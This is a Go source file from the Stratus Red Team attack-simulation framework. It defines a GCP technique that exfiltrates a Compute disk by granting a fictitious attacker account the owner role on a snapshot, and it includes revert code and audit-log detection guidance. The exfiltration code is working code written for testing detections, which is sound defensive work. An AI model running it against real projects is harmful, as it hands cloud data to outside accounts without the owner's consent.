package gcp

import (
	compute "cloud.google.com/go/compute/apiv1"
	"context"
	computepb "google.golang.org/genproto/googleapis/cloud/compute/v1"
	"log"

	_ "embed"
	"fmt"
	"github.com/datadog/stratus-red-team/v2/internal/providers"
	gcp_utils "github.com/datadog/stratus-red-team/v2/internal/utils/gcp"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
)

//go:embed main.tf
var tf []byte

const codeBlock = "```"
const AttackTechniqueId = "gcp.exfiltration.share-compute-snapshot"

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.exfiltration.share-compute-snapshot",
		FriendlyName: "Exfiltrate Compute Disk by sharing a snapshot",
		Description: `
Exfiltrates a Compute Disk by sharing a snapshot with a fictitious attacker account.

Warm-up:

- Create a Compute Disk and a Snapshot

Detonation:

- Set the IAM policy of the snapshot so that the attacker account has permissions to access it

!!! note

	Since the target e-mail must exist for this attack simulation to work, Stratus Red Team grants the role to ` + gcp_utils.DefaultFictitiousAttackerEmail + ` by default.
	This is a real Google account, owned by Stratus Red Team maintainers and that is not used for any other purpose than this attack simulation. However, you can override
	this behavior by setting the environment variable <code>` + gcp_utils.AttackerEmailEnvVarKey + `</code>, for instance:

	` + codeBlock + `bash
	export ` + gcp_utils.AttackerEmailEnvVarKey + `="your-own-gmail-account@gmail.com"
	stratus detonate ` + AttackTechniqueId + `
	` + codeBlock + `
`,
		Detection: `
You can detect when someone changes the IAM policy of a Compute Snapshot, using the GCP Admin Activity audit logs event <code>v1.compute.snapshots.setIamPolicy</code>. Here's a sample event, shortened for clarity:

` + codeBlock + `json hl_lines="18 20 25""
{
  "protoPayload": {
    "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
    "authenticationInfo": {
      "principalEmail": "user-sharing-the-snapshot@domain.tld",
      "principalSubject": "user:user-sharing-the-snapshot@domain.tld"
    },
    "requestMetadata": {
      "callerIp": "34.33.32.31",
      "callerSuppliedUserAgent": "google-cloud-sdk gcloud/..."
    },
    "resourceName": "projects/victim-project/global/snapshots/stratus-red-team-victim-snapshot",
    "request": {
      "policy": {
        "version": "3",
        "bindings": [
          {
            "role": "roles/owner",
            "members": [
              "user:attacker@gmail.com"
            ]
          }
        ]
      },
      "@type": "type.googleapis.com/compute.snapshots.setIamPolicy"
    }
  }
}
` + codeBlock + `

Based on these events, detection strategies may include:

- Alerting when the IAM policy of a Compute Snapshot is changed, especially if such a sharing mechanism is not part of your normal operations. Sample GCP Logs Explorer query:

` + codeBlock + `sql
protoPayload.methodName="v1.compute.snapshots.setIamPolicy"
` + codeBlock + `
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Exfiltration},
		Detonate:                   detonate,
		Revert:                     revert,
		PrerequisitesTerraformCode: tf,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	gcp := providers.GCP()
	snapshotName := params["snapshot_name"]
	zone := params["zone"]
	attackerPrincipal := gcp_utils.GetAttackerPrincipal()

	log.Println("Exfiltrating " + snapshotName + " by sharing it with a fictitious attacker")
	if err := shareSnapshot(context.Background(), gcp, snapshotName, zone, attackerPrincipal); err != nil {
		return fmt.Errorf("failed to share snapshot: %w", err)
	}
	log.Println("Successfully shared snapshot with a fictitious attacker account " + attackerPrincipal)
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	gcp := providers.GCP()
	snapshotName := params["snapshot_name"]
	zone := params["zone"]

	log.Println("Unsharing " + snapshotName)
	if err := unshareSnapshot(context.Background(), gcp, snapshotName, zone); err != nil {
		return fmt.Errorf("unable to unshare snapshot: %w", err)
	}
	log.Println("Successfully unshared the snapshot - it is now private again")
	return nil
}

func shareSnapshot(ctx context.Context, gcp *providers.GCPProvider, snapshotName string, zone string, targetPrincipal string) error {
	snapshotClient, err := compute.NewSnapshotsRESTClient(ctx, gcp.Options())
	if err != nil {
		return fmt.Errorf("unable to create compute client: %w", err)
	}

	roleName := "roles/owner"

	_, err = snapshotClient.SetIamPolicy(ctx, &computepb.SetIamPolicySnapshotRequest{
		Resource: snapshotName,
		Project:  gcp.GetProjectId(),
		GlobalSetPolicyRequestResource: &computepb.GlobalSetPolicyRequest{
			Policy: &computepb.Policy{
				Bindings: []*computepb.Binding{
					{
						Members: []string{targetPrincipal},
						Role:    &roleName,
					},
				},
			},
		},
	})
	if err != nil {
		return fmt.Errorf("unable to set iam policy: %w", err)
	}
	return nil
}

func unshareSnapshot(ctx context.Context, gcp *providers.GCPProvider, snapshotName string, zone string) error {
	snapshotClient, err := compute.NewSnapshotsRESTClient(ctx, gcp.Options())
	if err != nil {
		return fmt.Errorf("unable to create compute client: %w", err)
	}

	_, err = snapshotClient.SetIamPolicy(ctx, &computepb.SetIamPolicySnapshotRequest{
		Resource: snapshotName,
		Project:  gcp.GetProjectId(),
		GlobalSetPolicyRequestResource: &computepb.GlobalSetPolicyRequest{
			Policy: &computepb.Policy{
				Bindings: []*computepb.Binding{},
			},
		},
	})
	if err != nil {
		return fmt.Errorf("unable to set iam policy: %w", err)
	}
	return nil
}
